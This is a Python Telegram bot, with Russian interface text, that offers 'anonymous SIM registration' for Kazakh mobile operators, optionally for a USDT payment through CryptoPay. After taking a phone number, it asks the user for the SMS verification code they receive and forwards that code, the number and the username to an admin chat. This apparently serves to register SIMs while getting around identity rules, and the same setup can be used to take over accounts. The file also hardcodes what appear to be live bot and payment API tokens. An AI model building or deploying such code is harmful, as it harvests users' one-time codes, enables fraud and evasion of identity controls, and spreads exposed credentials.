import asyncio
import logging
import re
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiocryptopay import AioCryptoPay, Networks

# ================= НАСТРОЙКИ =================
TOKEN = "8644586406:AAE77FSG_ddArp7DnhkpMu8HtQy5SaqItgE"          # Telegram Bot токен
ADMIN_ID = 8209617821
CRYPTO_TOKEN = "552977:AABwZSaXYMIl5cJIpPZgfGgE5tek7vHNaX4"      # ← новый токен CryptoPay

# ПЕРЕКЛЮЧАТЕЛЬ РЕЖИМА
FREE_MODE = True          # True = бесплатно (тест), False = с оплатой
PRICE_USD = 2.58

# Логирование (чтобы видеть ошибки)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# CryptoPay клиент — явно указываем MAIN_NET (или TEST_NET при тестировании)
crypto = AioCryptoPay(
    token=CRYPTO_TOKEN.strip(),
    network=Networks.MAIN_NET   # поменяй на Networks.TEST_NET если нужно тестировать
)

router = Router()
dp.include_router(router)

class RegForm(StatesGroup):
    operator = State()
    phone = State()

pending_requests: List[Dict[str, Any]] = []

# ================= КЛАВИАТУРЫ =================
def get_main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📞 Зарегистрировать номер")]],
        resize_keyboard=True
    )

def get_operators_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Activ"), KeyboardButton(text="Tele2"), KeyboardButton(text="Altel")],
            [KeyboardButton(text="← Назад")]
        ],
        resize_keyboard=True
    )

# ================= ХЕНДЛЕРЫ =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    status = "🆓 ТЕСТОВЫЙ РЕЖИМ (БЕСПЛАТНО)" if FREE_MODE else f"💰 ЦЕНА: ${PRICE_USD} USDT"
    await message.answer(
        f"👋 Привет! Анонимная регистрация SIM.\n\n{status}",
        reply_markup=get_main_kb()
    )

@router.message(F.text == "📞 Зарегистрировать номер")
async def start_reg(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("📊 Выбери оператора:", reply_markup=get_operators_kb())
    await state.set_state(RegForm.operator)

@router.message(F.text == "← Назад")
async def back_to_main(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("↩️ Главное меню", reply_markup=get_main_kb())

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_op(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(
        f"📱 Оператор: {message.text}\n\nВведи номер в формате 77xxxxxxxx:",
        reply_markup=get_operators_kb()
    )
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    phone = re.sub(r"\D", "", message.text)
    if len(phone) != 10 or not phone.startswith("7"):
        await message.answer("❌ Номер должен быть 10 цифр и начинаться с 7\nПример: 7712345678\nПопробуй ещё раз:")
        return

    data = await state.get_data()
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID {message.from_user.id}"

    if FREE_MODE:
        rid = len(pending_requests) + 1
        pending_requests.append({
            "id": rid,
            "user_id": message.chat.id,
            "username": user_info,
            "phone": phone,
            "operator": data['operator'],
            "status": "waiting_sms"
        })
        await message.answer("✅ Заявка принята!\nТеперь пришли код из СМС:")
        await bot.send_message(
            ADMIN_ID,
            f"🆓 ТЕСТОВЫЙ РЕЖИМ\nЗаявка #{rid}\nПользователь: {user_info}\nНомер: {phone}\nОператор: {data['operator']}"
        )
        await state.clear()
        return

    # Платный режим
    try:
        invoice = await crypto.create_invoice(
            asset="USDT",
            amount=PRICE_USD,
            description=f"Регистрация номера {phone} ({data['operator']})"
        )

        rid = invoice.invoice_id
        pending_requests.append({
            "id": rid,
            "user_id": message.chat.id,
            "username": user_info,
            "phone": phone,
            "operator": data['operator'],
            "status": "waiting_pay"
        })

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить USDT", url=invoice.pay_url)],
            [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_{rid}")]
        ])

        await message.answer(
            f"🧾 Заявка #{rid}\nСумма: {PRICE_USD} USDT\nОператор: {data['operator']}\nНомер: {phone}",
            reply_markup=kb
        )
        await state.clear()

    except Exception as e:
        logging.exception("Ошибка при создании инвойса CryptoPay")
        await message.answer(f"⚠️ Ошибка платежной системы\n{str(e)[:120]}")

@router.callback_query(F.data.startswith("check_"))
async def check_payment(callback: CallbackQuery):
    try:
        rid = int(callback.data.split("_")[1])
        invoices = await crypto.get_invoices(status="paid")
        is_paid = any(inv.invoice_id == rid for inv in (invoices.result or []))

        if is_paid:
            for req in pending_requests:
                if req["id"] == rid and req["status"] == "waiting_pay":
                    req["status"] = "waiting_sms"
                    await callback.message.edit_text("✅ Оплата прошла!\nТеперь пришли код из СМС:")
                    await callback.answer("Оплата найдена")
                    return
        await callback.answer("Оплата пока не найдена. Подожди 10–30 секунд и попробуй снова.", show_alert=True)
    except Exception as e:
        logging.exception("Ошибка проверки оплаты")
        await callback.answer(f"Ошибка проверки: {str(e)[:80]}", show_alert=True)

@router.message()
async def catch_sms(message: Message):
    if message.chat.id == ADMIN_ID:
        return

    req = next((r for r in pending_requests if r["user_id"] == message.chat.id and r["status"] == "waiting_sms"), None)
    if not req:
        return

    code = message.text.strip()
    if not code.isdigit():
        await message.answer("❗ Пришли только цифры из СМС")
        return

    await message.answer("⏳ Код принят. Ожидай завершения...")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏁 Завершить регистрацию", callback_data=f"done_{req['id']}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"🔑 КОД ПРИШЁЛ\nЗаявка: {req['id']}\nПользователь: {req['username']}\nНомер: {req['phone']}\nОператор: {req['operator']}\nКод: `{code}`",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@router.callback_query(F.data.startswith("done_"))
async def finish_job(callback: CallbackQuery):
    try:
        rid = int(callback.data.split("_")[1])
        for req in pending_requests:
            if req["id"] == rid:
                req["status"] = "completed"
                await bot.send_message(req["user_id"], "🎉 Регистрация успешно завершена!")
                await callback.message.edit_text(f"🏁 Заявка #{rid} закрыта")
                await callback.answer("Готово")
                return
        await callback.answer("Заявка не найдена", show_alert=True)
    except Exception as e:
        logging.exception("Ошибка завершения заявки")
        await callback.answer("Ошибка", show_alert=True)

async def main():
    logging.info("Бот запущен")
    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])

if __name__ == "__main__":
    asyncio.run(main())